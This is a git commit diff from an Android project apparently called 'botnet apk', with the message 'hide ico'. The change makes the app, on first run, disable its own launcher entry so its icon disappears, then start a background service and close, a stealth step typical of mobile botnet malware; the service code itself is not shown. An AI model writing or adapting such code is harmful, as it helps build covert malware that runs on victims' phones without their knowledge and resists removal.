01f90df2b9c626f8559e11ae514eaf88c863c556
ScRiPt1337 <26287773+ScRiPt1337@users.noreply.github.com>
2018-10-16 09:40:57 -0700

    hide ico

--- botnet apk/app/src/main/java/com/example/kico/botnet/MainActivity.java
+++ botnet apk/app/src/main/java/com/example/kico/botnet/MainActivity.java
@@ -1,7 +1,9 @@
 package com.example.kico.botnet;
 
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.preference.PreferenceManager;
 import android.support.v7.app.AppCompatActivity;
@@ -16,6 +18,9 @@ public class MainActivity extends AppCompatActivity {
         boolean isFirstRun = wmbPreference.getBoolean("FIRSTRUN", true);
         if (isFirstRun)
         {
+            PackageManager p = getPackageManager();
+            ComponentName componentName = new ComponentName(this, MainActivity.class);
+            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
             Intent st = new Intent(this,MyService.class);
             startService(st);
             finish();
